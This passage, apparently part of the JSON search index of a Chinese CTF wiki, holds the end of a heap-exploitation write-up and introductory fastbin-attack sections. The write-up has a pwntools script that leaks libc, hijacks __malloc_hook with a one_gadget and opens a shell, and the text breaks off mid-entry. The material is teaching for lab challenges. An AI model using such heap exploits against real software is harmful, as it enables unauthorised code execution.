enabled\n\n\n\n\n64\u4f4d\u7a0b\u5e8f\uff0c\u4fdd\u62a4\u5168\u90e8\u5f00\u542f\u3002\n\n\n\u57fa\u672c\u529f\u80fd\n\n\n\u7a0b\u5e8f\u662f\u4e00\u4e2a\u5806\u5206\u914d\u5668\uff0c\u4e3b\u8981\u7531\u4ee5\u4e0b\u56db\u79cd\u529f\u80fd\n\n\n  \nputs\n(\n1. Allocate\n);\n\n  \nputs\n(\n2. Fill\n);\n\n  \nputs\n(\n3. Free\n);\n\n  \nputs\n(\n4. Dump\n);\n\n  \nputs\n(\n5. Exit\n);\n\n  \nreturn\n \nprintf\n(\nCommand: \n);\n\n\n\n\n\n\u5176\u4e2d\uff0c\u6bcf\u6b21\u8bfb\u53d6\u547d\u4ee4\u7684\u51fd\u6570\u7531\u8bfb\u53d6\u6307\u5b9a\u957f\u5ea6\u7684\u5b57\u7b26\u4e32\u7684\u51fd\u6570\u800c\u51b3\u5b9a\u3002\n\n\n\u901a\u8fc7\u5206\u914d\u51fd\u6570\n\n\nvoid\n \n__fastcall\n \nallocate\n(\n__int64\n \na1\n)\n\n\n{\n\n  \nsigned\n \nint\n \ni\n;\n \n// [rsp+10h] [rbp-10h]\n\n  \nsigned\n \nint\n \nv2\n;\n \n// [rsp+14h] [rbp-Ch]\n\n  \nvoid\n \n*\nv3\n;\n \n// [rsp+18h] [rbp-8h]\n\n\n  \nfor\n \n(\n \ni\n \n=\n \n0\n;\n \ni\n \n=\n \n15\n;\n \n++\ni\n \n)\n\n  \n{\n\n    \nif\n \n(\n \n!*\n(\n_DWORD\n \n*\n)(\n24LL\n \n*\n \ni\n \n+\n \na1\n)\n \n)\n\n    \n{\n\n      \nprintf\n(\nSize: \n);\n\n      \nv2\n \n=\n \nread_num\n();\n\n      \nif\n \n(\n \nv2\n \n \n0\n \n)\n\n      \n{\n\n        \nif\n \n(\n \nv2\n \n \n4096\n \n)\n\n          \nv2\n \n=\n \n4096\n;\n\n        \nv3\n \n=\n \ncalloc\n(\nv2\n,\n \n1uLL\n);\n\n        \nif\n \n(\n \n!\nv3\n \n)\n\n          \nexit\n(\n-\n1\n);\n\n        \n*\n(\n_DWORD\n \n*\n)(\n24LL\n \n*\n \ni\n \n+\n \na1\n)\n \n=\n \n1\n;\n\n        \n*\n(\n_QWORD\n \n*\n)(\na1\n \n+\n \n24LL\n \n*\n \ni\n \n+\n \n8\n)\n \n=\n \nv2\n;\n\n        \n*\n(\n_QWORD\n \n*\n)(\na1\n \n+\n \n24LL\n \n*\n \ni\n \n+\n \n16\n)\n \n=\n \nv3\n;\n\n        \nprintf\n(\nAllocate Index %d\n\\n\n,\n \n(\nunsigned\n \nint\n)\ni\n);\n\n      \n}\n\n      \nreturn\n;\n\n    \n}\n\n  \n}\n\n\n}\n\n\n\n\n\n\u7533\u8bf7\u7684 chunk \u7684\u6700\u5927\u4e3a 4096\u3002\u6b64\u5916\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u6bcf\u4e2a chunk \u4e3b\u8981\u6709\u4e09\u4e2a\u5b57\u6bb5\uff1a\u662f\u5426\u5728\u4f7f\u7528\uff0c\u5806\u5757\u5927\u5c0f\uff0c\u5806\u5757\u4f4d\u7f6e\u3002\u6545\u800c\u6211\u4eec\u53ef\u4ee5\u521b\u5efa\u5bf9\u5e94\u7684\u7ed3\u6784\u4f53\u3002\n\n\n00000000 chunk           struc ; (sizeof=0x18, mappedto_6)\n00000000 inuse           dq ?\n00000008 size            dq ?\n00000010 ptr             dq ?\n00000018 chunk           ends\n\n\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662f\u5806\u5757\u662f\u7531 calloc \u5206\u914d\u7684\uff0c\u6240\u4ee5 chunk \u4e2d\u7684\u5185\u5bb9\u5168\u90fd\u4e3a\n\\x00\n\u3002\n\n\n\u5728\u586b\u5145\u5185\u5bb9\u7684\u529f\u80fd\u4e2d\uff0c\u4f7f\u7528\u8bfb\u53d6\u5185\u5bb9\u7684\u51fd\u6570\u662f\u76f4\u63a5\u8bfb\u53d6\u6307\u5b9a\u957f\u5ea6\u7684\u5185\u5bb9\uff0c\u5e76\u6ca1\u6709\u8bbe\u7f6e\u5b57\u7b26\u4e32\u7ed3\u5c3e\u3002\n\u800c\u4e14\u6bd4\u8f83\u6709\u610f\u601d\u7684\u662f\uff0c\u8fd9\u4e2a\u6307\u5b9a\u957f\u5ea6\u662f\u6211\u4eec\u6307\u5b9a\u7684\uff0c\u5e76\u4e0d\u662f\u4e4b\u524d chunk \u5206\u914d\u65f6\u6307\u5b9a\u7684\u957f\u5ea6\uff0c\u6240\u4ee5\u8fd9\u91cc\u5c31\u51fa\u73b0\u4e86\u4efb\u610f\u5806\u6ea2\u51fa\u7684\u60c5\u5f62\u3002\n\n\n__int64\n \n__fastcall\n \nfill\n(\nchunk\n \n*\na1\n)\n\n\n{\n\n  \n__int64\n \nresult\n;\n \n// rax\n\n  \nint\n \nv2\n;\n \n// [rsp+18h] [rbp-8h]\n\n  \nint\n \nv3\n;\n \n// [rsp+1Ch] [rbp-4h]\n\n\n  \nprintf\n(\nIndex: \n);\n\n  \nresult\n \n=\n \nread_num\n();\n\n  \nv2\n \n=\n \nresult\n;\n\n  \nif\n \n(\n \n(\nsigned\n \nint\n)\nresult\n \n=\n \n0\n \n \n(\nsigned\n \nint\n)\nresult\n \n=\n \n15\n \n)\n\n  \n{\n\n    \nresult\n \n=\n \nLODWORD\n(\na1\n[(\nsigned\n \nint\n)\nresult\n].\ninuse\n);\n\n    \nif\n \n(\n \n(\n_DWORD\n)\nresult\n \n==\n \n1\n \n)\n\n    \n{\n\n      \nprintf\n(\nSize: \n);\n\n      \nresult\n \n=\n \nread_num\n();\n\n      \nv3\n \n=\n \nresult\n;\n\n      \nif\n \n(\n \n(\nsigned\n \nint\n)\nresult\n \n \n0\n \n)\n\n      \n{\n\n        \nprintf\n(\nContent: \n);\n\n        \nresult\n \n=\n \nread_content\n((\nchar\n \n*\n)\na1\n[\nv2\n].\nptr\n,\n \nv3\n);\n\n      \n}\n\n    \n}\n\n  \n}\n\n  \nreturn\n \nresult\n;\n\n\n}\n\n\n\n\n\n\u5728\u91ca\u653echunk\u7684\u529f\u80fd\u4e2d\u8be5\u8bbe\u7f6e\u7684\u90fd\u8bbe\u7f6e\u4e86\u3002\n\n\n__int64\n \n__fastcall\n \nfree_chunk\n(\nchunk\n \n*\na1\n)\n\n\n{\n\n  \n__int64\n \nresult\n;\n \n// rax\n\n  \nint\n \nv2\n;\n \n// [rsp+1Ch] [rbp-4h]\n\n\n  \nprintf\n(\nIndex: \n);\n\n  \nresult\n \n=\n \nread_num\n();\n\n  \nv2\n \n=\n \nresult\n;\n\n  \nif\n \n(\n \n(\nsigned\n \nint\n)\nresult\n \n=\n \n0\n \n \n(\nsigned\n \nint\n)\nresult\n \n=\n \n15\n \n)\n\n  \n{\n\n    \nresult\n \n=\n \nLODWORD\n(\na1\n[(\nsigned\n \nint\n)\nresult\n].\ninuse\n);\n\n    \nif\n \n(\n \n(\n_DWORD\n)\nresult\n \n==\n \n1\n \n)\n\n    \n{\n\n      \nLODWORD\n(\na1\n[\nv2\n].\ninuse\n)\n \n=\n \n0\n;\n\n      \na1\n[\nv2\n].\nsize\n \n=\n \n0LL\n;\n\n      \nfree\n(\na1\n[\nv2\n].\nptr\n);\n\n      \nresult\n \n=\n \n(\n__int64\n)\na1\n[\nv2\n];\n\n      \n*\n(\n_QWORD\n \n*\n)(\nresult\n \n+\n \n16\n)\n \n=\n \n0LL\n;\n\n    \n}\n\n  \n}\n\n  \nreturn\n \nresult\n;\n\n\n}\n\n\n\n\n\ndump \u5c31\u662f\u8f93\u51fa\u5bf9\u5e94\u7d22\u5f15 chunk \u7684\u5185\u5bb9\u3002\n\n\n\u5229\u7528\u601d\u8def\n\n\n\u53ef\u4ee5\u786e\u5b9a\u7684\u662f\uff0c\u6211\u4eec\u4e3b\u8981\u6709\u7684\u6f0f\u6d1e\u5c31\u662f\u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa\u3002\u7531\u4e8e\u8be5\u7a0b\u5e8f\u51e0\u4e4e\u6240\u6709\u4fdd\u62a4\u90fd\u5f00\u542f\u4e86\uff0c\u6240\u4ee5\u6211\u4eec\u5fc5\u987b\u8981\u6709\u4e00\u4e9b\u6cc4\u6f0f\u624d\u53ef\u4ee5\u63a7\u5236\u7a0b\u5e8f\u7684\u6d41\u7a0b\u3002\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b\n\n\n\n\n\u5229\u7528 unsorted bin \u5730\u5740\u6cc4\u6f0f libc \u57fa\u5730\u5740\u3002\n\n\n\u5229\u7528 fastbin attack \u5c06chunk \u5206\u914d\u5230 malloc_hook \u9644\u8fd1\u3002\n\n\n\n\n\u6cc4\u6f0f libc \u57fa\u5730\u5740\n\n\n\u7531\u4e8e\u6211\u4eec\u662f\u5e0c\u671b\u4f7f\u7528 unsorted bin \u6765\u6cc4\u6f0f libc \u57fa\u5730\u5740\uff0c\u6240\u4ee5\u5fc5\u987b\u8981\u6709 chunk \u53ef\u4ee5\u88ab\u94fe\u63a5\u5230 unsorted bin \u4e2d\uff0c\u6240\u4ee5\u8be5 chunk \u4e0d\u80fd\u4f7f fastbin chunk\uff0c\u4e5f\u4e0d\u80fd\u548c top chunk \u76f8\u90bb\u3002\u56e0\u4e3a\u524d\u8005\u4f1a\u88ab\u6dfb\u52a0\u5230 fastbin \u4e2d\uff0c\u540e\u8005\u5728\u4e0d\u662ffastbin \u7684\u60c5\u51b5\u4e0b\uff0c\u4f1a\u88ab\u5408\u5e76\u5230 top chunk \u4e2d\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u8fd9\u91cc\u6784\u9020\u4e00\u4e2a small bin chunk\u3002\u5728\u5c06\u8be5 chunk \u91ca\u653e\u5230 unsorted bin \u7684\u540c\u65f6\uff0c\u4e5f\u9700\u8981\u8ba9\u53e6\u5916\u4e00\u4e2a\u6b63\u5728\u4f7f\u7528\u7684 chunk \u53ef\u4ee5\u540c\u65f6\u6307\u5411\u8be5 chunk \u7684\u4f4d\u7f6e\u3002\u8fd9\u6837\u624d\u53ef\u4ee5\u8fdb\u884c\u6cc4\u6f0f\u3002\u5177\u4f53\u8bbe\u8ba1\u5982\u4e0b\n\n\n    \n# 1. leak libc base\n\n    \nallocate\n(\n0x10\n)\n  \n# idx 0, 0x00\n\n    \nallocate\n(\n0x10\n)\n  \n# idx 1, 0x20\n\n    \nallocate\n(\n0x10\n)\n  \n# idx 2, 0x40\n\n    \nallocate\n(\n0x10\n)\n  \n# idx 3, 0x60\n\n    \nallocate\n(\n0x80\n)\n  \n# idx 4, 0x80\n\n    \n# free idx 1, 2, fastbin[0]-\nidx1-\nidx2-\nNULL\n\n    \nfree\n(\n2\n)\n\n    \nfree\n(\n1\n)\n\n\n\n\n\n\u9996\u5148\uff0c\u6211\u4eec\u7533\u8bf7\u4e86 5 \u4e2achunk\uff0c\u5e76\u91ca\u653e\u4e86\u4e24\u4e2achunk\uff0c\u6b64\u65f6\u5806\u7684\u60c5\u51b5\u5982\u4e0b\u3002\n\n\npwndbg\n x/20gx 0x55a03ca22000\n0x55a03ca22000: 0x0000000000000000  0x0000000000000021 idx \n0\n\n0x55a03ca22010: 0x0000000000000000  0x0000000000000000\n0x55a03ca22020: 0x0000000000000000  0x0000000000000021 idx \n1\n\n0x55a03ca22030: 0x000055a03ca22040  0x0000000000000000\n0x55a03ca22040: 0x0000000000000000  0x0000000000000021 idx \n2\n\n0x55a03ca22050: 0x0000000000000000  0x0000000000000000\n0x55a03ca22060: 0x0000000000000000  0x0000000000000021 idx \n3\n\n0x55a03ca22070: 0x0000000000000000  0x0000000000000000\n0x55a03ca22080: 0x0000000000000000  0x0000000000000091 idx \n4\n\n0x55a03ca22090: 0x0000000000000000  0x0000000000000000\npwndbg\n fastbins \nfastbins\n0x20: 0x55a03ca22020 \u2014\u25b8 0x55a03ca22040 \u25c2\u2014 0x0\n0x30: 0x0\n0x40: 0x0\n0x50: 0x0\n0x60: 0x0\n0x70: 0x0\n0x80: 0x0\n\n\n\n\n\u5f53\u6211\u4eec\u7f16\u8f91 idx0 \u540e\uff0c\u786e\u5b9e\u5df2\u7ecf\u5c06\u5176\u6307\u5411idx4\u4e86\u3002\u8fd9\u91cc\u4e4b\u6240\u4ee5\u53ef\u4ee5\u6210\u529f\u662f\u56e0\u4e3a\u5806\u7684\u59cb\u7ec8\u662f 4KB \u5bf9\u9f50\u7684\uff0c\u6240\u4ee5idx 4\u7684\u8d77\u59cb\u5730\u5740\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u5fc5\u7136\u662f0x80\u3002\n\n\n    \n# edit idx 0 chunk to particial overwrite idx1\ns fd to point to idx4\n\n    \npayload\n \n=\n \n0x10\n \n*\n \na\n \n+\n \np64\n(\n0\n)\n \n+\n \np64\n(\n0x21\n)\n \n+\n \np8\n(\n0x80\n)\n\n    \nfill\n(\n0\n,\n \nlen\n(\npayload\n),\n \npayload\n)\n\n\n\n\n\n\u4fee\u6539\u6210\u529f\u540e\u5982\u4e0b\n\n\npwndbg\n x/20gx 0x55a03ca22000\n0x55a03ca22000: 0x0000000000000000  0x0000000000000021\n0x55a03ca22010: 0x6161616161616161  0x6161616161616161\n0x55a03ca22020: 0x0000000000000000  0x0000000000000021\n0x55a03ca22030: 0x000055a03ca22080  0x0000000000000000\n0x55a03ca22040: 0x0000000000000000  0x0000000000000021\n0x55a03ca22050: 0x0000000000000000  0x0000000000000000\n0x55a03ca22060: 0x0000000000000000  0x0000000000000021\n0x55a03ca22070: 0x0000000000000000  0x0000000000000000\n0x55a03ca22080: 0x0000000000000000  0x0000000000000091\n0x55a03ca22090: 0x0000000000000000  0x0000000000000000\npwndbg\n fastbins \nfastbins\n0x20: 0x55a03ca22020 \u2014\u25b8 0x55a03ca22080 \u25c2\u2014 0x0\n0x30: 0x0\n0x40: 0x0\n0x50: 0x0\n0x60: 0x0\n0x70: 0x0\n0x80: 0x0\n\n\n\n\n\u90a3\u4e48\uff0c\u5f53\u6211\u4eec\u518d\u6b21\u7533\u8bf7\u4e24\u4e2a\u65f6\uff0c\u7b2c\u4e8c\u4e2a\u7533\u8bf7\u5230\u7684\u5c31\u662fidx 4\u5904\u7684chunk\u3002\u4e3a\u4e86\u80fd\u591f\u7533\u8bf7\u6210\u529f\uff0c\u6211\u4eec\u9700\u8981\u786e\u4fdd idx4 \u7684size \u4e0e\u5f53\u524d fastbin \u7684\u5927\u5c0f\u4e00\u81f4\uff0c\u6240\u4ee5\uff0c\u6211\u4eec\u5f97\u4fee\u6539\u5b83\u7684\u5927\u5c0f\u3002\u7533\u8bf7\u6210\u529f\u540e\uff0cidx2\u4f1a\u6307\u5411idx4\u3002\n\n\n    \n# if we want to allocate at idx4, we must set it\ns size as 0x21\n\n    \npayload\n \n=\n \n0x10\n \n*\n \na\n \n+\n \np64\n(\n0\n)\n \n+\n \np64\n(\n0x21\n)\n\n    \nfill\n(\n3\n,\n \nlen\n(\npayload\n),\n \npayload\n)\n\n    \nallocate\n(\n0x10\n)\n  \n# idx 1\n\n    \nallocate\n(\n0x10\n)\n  \n# idx 2, which point to idx4\ns location\n\n\n\n\n\n\u4e4b\u540e\uff0c\u5982\u679c\u6211\u4eec\u60f3\u8981\u5c06 idx 4 \u653e\u5230 unsorted bin \u4e2d\u7684\u8bdd\uff0c\u4e3a\u4e86\u9632\u6b62\u5176\u4e0etop chunk \u5408\u5e76\uff0c\u6211\u4eec\u9700\u8981\u518d\u6b21\u7533\u8bf7\u4e00\u4e2achunk\u3002\u6b64\u540e\u518d\u91ca\u653e idx4 \u5c31\u4f1a\u8fdb\u5165 unsorted bin\u4e2d\u53bb\u4e86\u3002\u6b64\u65f6\u7531\u4e8e idx2 \u4e5f\u6307\u5411\u8fd9\u4e2a\u5730\u5740\uff0c\u6240\u4ee5\u6211\u4eec\u76f4\u63a5\u5c55\u793a\u4ed6\u7684\u5185\u5bb9\u5c31\u53ef\u4ee5\u5f97\u5230unsorted bin\u7684\u5730\u5740\u4e86\u3002\n\n\n    \n# if want to free idx4 to unsorted bin, we must fix its size\n\n    \npayload\n \n=\n \n0x10\n \n*\n \na\n \n+\n \np64\n(\n0\n)\n \n+\n \np64\n(\n0x91\n)\n\n    \nfill\n(\n3\n,\n \nlen\n(\npayload\n),\n \npayload\n)\n\n    \n# allocate a chunk in order when free idx4, idx 4 not consolidate with top chunk\n\n    \nallocate\n(\n0x80\n)\n  \n# idx 5\n\n    \nfree\n(\n4\n)\n\n    \n# as idx 2 point to idx4, just show this\n\n    \ndump\n(\n2\n)\n\n    \np\n.\nrecvuntil\n(\nContent: \n\\n\n)\n\n    \nunsortedbin_addr\n \n=\n \nu64\n(\np\n.\nrecv\n(\n8\n))\n\n    \nmain_arena\n \n=\n \nunsortedbin_addr\n \n-\n \noffset_unsortedbin_main_arena\n\n    \nlog\n.\nsuccess\n(\nmain arena addr: \n \n+\n \nhex\n(\nmain_arena\n))\n\n    \nmain_arena_offset\n \n=\n \n0x3c4b20\n\n    \nlibc_base\n \n=\n \nmain_arena\n \n-\n \nmain_arena_offset\n\n    \nlog\n.\nsuccess\n(\nlibc base addr: \n \n+\n \nhex\n(\nlibc_base\n))\n\n\n\n\n\n\u5206\u914dchunk\u5230malloc_hook\u9644\u8fd1\n\n\n\u7531\u4e8e malloc hook \u9644\u8fd1\u7684 chunk \u5927\u5c0f\u4e3a 0x7f\uff0c\u6240\u4ee5\u6570\u636e\u533a\u57df\u4e3a0x60\u3002\u8fd9\u91cc\u6211\u4eec\u518d\u6b21\u7533\u8bf7\u7684\u65f6\u5019\uff0c\u5bf9\u5e94 fastbin \u94fe\u8868\u4e2d\u6ca1\u6709\u76f8\u5e94\u5927\u5c0fchunk\uff0c\u6240\u4ee5\u6839\u636e\u5806\u5206\u914d\u5668\u89c4\u5219\uff0c\u5b83\u4f1a\u4f9d\u6b21\u5904\u7406unsorted bin\u4e2d\u7684chunk\uff0c\u5c06\u5176\u653e\u5165\u5230\u5bf9\u5e94\u7684bin\u4e2d\uff0c\u4e4b\u540e\u4f1a\u518d\u6b21\u5c1d\u8bd5\u5206\u914d chunk\uff0c\u56e0\u4e3a\u4e4b\u524d\u91ca\u653e\u7684 chunk \u6bd4\u5f53\u524d\u7533\u8bf7\u7684 chunk \u5927\uff0c\u6240\u4ee5\u53ef\u4ee5\u4ece\u5176\u524d\u9762\u5206\u5272\u51fa\u6765\u4e00\u5757\u3002\u6240\u4ee5 idx2 \u4ecd\u7136\u6307\u5411\u8be5\u4f4d\u7f6e\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u7c7b\u4f3c\u7684\u529e\u6cd5\u5148\u91ca\u653e\u7533\u8bf7\u5230\u7684chunk\uff0c\u7136\u540e\u518d\u6b21\u4fee\u6539 fd \u6307\u9488\u4e3a fake chunk \u5373\u53ef\u3002\u6b64\u540e\u6211\u4eec\u4fee\u6539 malloc_hook \u5904\u7684\u6307\u9488\u5373\u53ef\u5f97\u5230\u89e6\u53d1 onegadget\u3002\n\n\n# 2. malloc to malloc_hook nearby\n\n\n# allocate a 0x70 size chunk same with malloc hook nearby chunk, idx4\n\n\nallocate\n(\n0x60\n)\n\n\nfree\n(\n4\n)\n\n\n# edit idx4\ns fd point to fake chunk\n\n\nfake_chunk_addr\n \n=\n \nmain_arena\n \n-\n \n0x33\n\n\nfake_chunk\n \n=\n \np64\n(\nfake_chunk_addr\n)\n\n\nfill\n(\n2\n,\n \nlen\n(\nfake_chunk\n),\n \nfake_chunk\n)\n\n\n\nallocate\n(\n0x60\n)\n  \n# idx 4\n\n\nallocate\n(\n0x60\n)\n  \n# idx 6\n\n\n\none_gadget_addr\n \n=\n \nlibc_base\n \n+\n \n0x4526a\n\n\npayload\n \n=\n \n0x13\n \n*\n \na\n \n+\n \np64\n(\none_gadget_addr\n)\n\n\nfill\n(\n6\n,\n \nlen\n(\npayload\n),\n \npayload\n)\n\n\n# trigger malloc_hook\n\n\nallocate\n(\n0x100\n)\n\n\np\n.\ninteractive\n()\n \n\n\n\u540c\u65f6\uff0c\u8fd9\u91cc\u7684 onegadget \u5730\u5740\u4e5f\u53ef\u80fd\u9700\u8981\u5c1d\u8bd5\u591a\u6b21\u3002\n\n\n\u9898\u76ee\n\n\n\n\nL-CTF2016\u2013pwn200\n\n\n\n\n\u53c2\u8003\u6587\u732e\n\n\n\n\nhttps://www.gulshansingh.com/posts/9447-ctf-2015-search-engine-writeup/\n\n\nhttp://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html\n\n\nhttps://www.slideshare.net/YOKARO-MON/oreo-hacklu-ctf-2014-65771717", 
            "title": "Fastbin Attack"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#fastbin-attack", 
            "text": "", 
            "title": "Fastbin Attack"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_1", 
            "text": "fastbin attack \u662f\u4e00\u7c7b\u6f0f\u6d1e\u7684\u5229\u7528\u65b9\u6cd5\uff0c\u662f\u6307\u6240\u6709\u57fa\u4e8e fastbin \u673a\u5236\u7684\u6f0f\u6d1e\u5229\u7528\u65b9\u6cd5\u3002\u8fd9\u7c7b\u5229\u7528\u7684\u524d\u63d0\u662f\uff1a   \u5b58\u5728\u5806\u6ea2\u51fa\u3001use-after-free \u7b49\u80fd\u63a7\u5236 chunk \u5185\u5bb9\u7684\u6f0f\u6d1e  \u6f0f\u6d1e\u53d1\u751f\u4e8e fastbin \u7c7b\u578b\u7684 chunk \u4e2d   \u5982\u679c\u7ec6\u5206\u7684\u8bdd\uff0c\u53ef\u4ee5\u505a\u5982\u4e0b\u7684\u5206\u7c7b\uff1a   Fastbin Double Free  House of Spirit  Alloc to Stack  Arbitrary Alloc   \u5176\u4e2d\uff0c\u524d\u4e24\u79cd\u4e3b\u8981\u6f0f\u6d1e\u4fa7\u91cd\u4e8e\u5229\u7528  free  \u51fd\u6570\u91ca\u653e \u771f\u7684 chunk \u6216\u4f2a\u9020\u7684 chunk \uff0c\u7136\u540e\u518d\u6b21\u7533\u8bf7 chunk \u8fdb\u884c\u653b\u51fb\uff0c\u540e\u4e24\u79cd\u4fa7\u91cd\u4e8e\u6545\u610f\u4fee\u6539  fd  \u6307\u9488\uff0c\u76f4\u63a5\u5229\u7528  malloc  \u7533\u8bf7\u6307\u5b9a\u4f4d\u7f6e chunk \u8fdb\u884c\u653b\u51fb\u3002", 
            "title": "\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_2", 
            "text": "fastbin attack \u5b58\u5728\u7684\u539f\u56e0\u5728\u4e8e fastbin \u662f\u4f7f\u7528\u5355\u94fe\u8868\u6765\u7ef4\u62a4\u91ca\u653e\u7684\u5806\u5757\u7684\uff0c\u5e76\u4e14\u7531 fastbin \u7ba1\u7406\u7684 chunk \u5373\u4f7f\u88ab\u91ca\u653e\uff0c\u5176 next_chunk \u7684 prev_inuse \u4f4d\u4e5f\u4e0d\u4f1a\u88ab\u6e05\u7a7a\u3002\n\u6211\u4eec\u6765\u770b\u4e00\u4e0b fastbin \u662f\u600e\u6837\u7ba1\u7406\u7a7a\u95f2 chunk \u7684\u3002 int main(void)\n{\n    void *chunk1,*chunk2,*chunk3;\n    chunk1=malloc(0x30);\n    chunk2=malloc(0x30);\n    chunk3=malloc(0x30);\n    //\u8fdb\u884c\u91ca\u653e\n    free(chunk1);\n    free(chunk2);\n    free(chunk3);\n    return 0;\n} \n\u91ca\u653e\u524d 0x602000:   0x0000000000000000  0x0000000000000041  === chunk1\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000000\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000041  === chunk2\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000  0x0000000000000000\n0x602080:   0x0000000000000000  0x0000000000000041  === chunk3\n0x602090:   0x0000000000000000  0x0000000000000000\n0x6020a0:   0x0000000000000000  0x0000000000000000\n0x6020b0:   0x0000000000000000  0x0000000000000000\n0x6020c0:   0x0000000000000000  0x0000000000020f41  === top chunk \n\u6267\u884c\u4e09\u6b21 free \u8fdb\u884c\u91ca\u653e\u540e 0x602000:   0x0000000000000000  0x0000000000000041  === chunk1\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000000\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000041  === chunk2\n0x602050:   0x0000000000602000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000  0x0000000000000000\n0x602080:   0x0000000000000000  0x0000000000000041  === chunk3\n0x602090:   0x0000000000602040  0x0000000000000000\n0x6020a0:   0x0000000000000000  0x0000000000000000\n0x6020b0:   0x0000000000000000  0x0000000000000000\n0x6020c0:   0x0000000000000000  0x0000000000020f41  === top chunk \n\u6b64\u65f6\u4f4d\u4e8e main_arena \u4e2d\u7684 fastbin \u94fe\u8868\u4e2d\u5df2\u7ecf\u50a8\u5b58\u4e86\u6307\u5411 chunk3 \u7684\u6307\u9488\uff0c\u5e76\u4e14 chunk 3\u30012\u30011\u6784\u6210\u4e86\u4e00\u4e2a\u5355\u94fe\u8868 Fastbins[idx=2, size=0x30,ptr=0x602080]\n=== Chunk(fd=0x602040, size=0x40, flags=PREV_INUSE)\n=== Chunk(fd=0x602000, size=0x40, flags=PREV_INUSE)\n=== Chunk(fd=0x000000, size=0x40, flags=PREV_INUSE)  \n\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u7684\u56fe\u7247\u6765\u8868\u793a\u8fd9\u4e00\u70b9", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#fastbin-double-free", 
            "text": "", 
            "title": "Fastbin Double Free"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_3", 
            "text": "Fastbin Double Free \u662f\u6307 fastbin \u7684 chunk \u53ef\u4ee5\u88ab\u591a\u6b21\u91ca\u653e\uff0c\u56e0\u6b64\u53ef\u4ee5\u5728 fastbin \u94fe\u8868\u4e2d\u5b58\u5728\u591a\u6b21\u3002\u8fd9\u6837\u5bfc\u81f4\u7684\u540e\u679c\u662f\u591a\u6b21\u5206\u914d\u53ef\u4ee5\u4ece fastbin \u94fe\u8868\u4e2d\u53d6\u51fa\u540c\u4e00\u4e2a\u5806\u5757\uff0c\u76f8\u5f53\u4e8e\u591a\u4e2a\u6307\u9488\u6307\u5411\u540c\u4e00\u4e2a\u5806\u5757\uff0c\u7ed3\u5408\u5806\u5757\u7684\u6570\u636e\u5185\u5bb9\u53ef\u4ee5\u5b9e\u73b0\u7c7b\u4f3c\u4e8e\u7c7b\u578b\u6df7\u6dc6(type confused)\u7684\u6548\u679c\u3002  Fastbin Double Free \u80fd\u591f\u6210\u529f\u5229\u7528\u4e3b\u8981\u6709\u4e24\u90e8\u5206\u7684\u539f\u56e0   fastbin \u7684\u5806\u5757\u88ab\u91ca\u653e\u540e next_chunk \u7684 pre_inuse \u4f4d\u4e0d\u4f1a\u88ab\u6e05\u7a7a  fastbin \u5728\u6267\u884c free \u7684\u65f6\u5019\u4ec5\u9a8c\u8bc1\u4e86 main_arena \u76f4\u63a5\u6307\u5411\u7684\u5757\uff0c\u5373\u94fe\u8868\u6307\u9488\u5934\u90e8\u7684\u5757\u3002\u5bf9\u4e8e\u94fe\u8868\u540e\u9762\u7684\u5757\uff0c\u5e76\u6ca1\u6709\u8fdb\u884c\u9a8c\u8bc1\u3002   /* Another simple check: make sure the top of the bin is not the\n       record we are going to add (i.e., double free).  */\n    if (__builtin_expect (old == p, 0))\n      {\n        errstr =  double free or corruption (fasttop) ;\n        goto errout;\n}", 
            "title": "\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_4", 
            "text": "\u4e0b\u9762\u7684\u793a\u4f8b\u7a0b\u5e8f\u8bf4\u660e\u4e86\u8fd9\u4e00\u70b9\uff0c\u5f53\u6211\u4eec\u8bd5\u56fe\u6267\u884c\u4ee5\u4e0b\u4ee3\u7801\u65f6  int main(void)\n{\n    void *chunk1,*chunk2,*chunk3;\n    chunk1=malloc(0x10);\n    chunk2=malloc(0x10);\n\n    free(chunk1);\n    free(chunk1);\n    return 0;\n} \n\u5982\u679c\u4f60\u6267\u884c\u8fd9\u4e2a\u7a0b\u5e8f\uff0c\u4e0d\u51fa\u610f\u5916\u7684\u8bdd\u4f1a\u5f97\u5230\u5982\u4e0b\u7684\u7ed3\u679c\uff0c\u8fd9\u6b63\u662f _int_free \u51fd\u6570\u68c0\u6d4b\u5230\u4e86 fastbin \u7684 double free\u3002 *** Error in `./tst : double free or corruption (fasttop): 0x0000000002200010 ***\n======= Backtrace: =========\n/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7fbb7a36c7e5]\n/lib/x86_64-linux-gnu/libc.so.6(+0x8037a)[0x7fbb7a37537a]\n/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7fbb7a37953c]\n./tst[0x4005a2]\n/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7fbb7a315830]\n./tst[0x400499]\n======= Memory map: ========\n00400000-00401000 r-xp 00000000 08:01 1052570                            /home/Ox9A82/tst/tst\n00600000-00601000 r--p 00000000 08:01 1052570                            /home/Ox9A82/tst/tst\n00601000-00602000 rw-p 00001000 08:01 1052570                            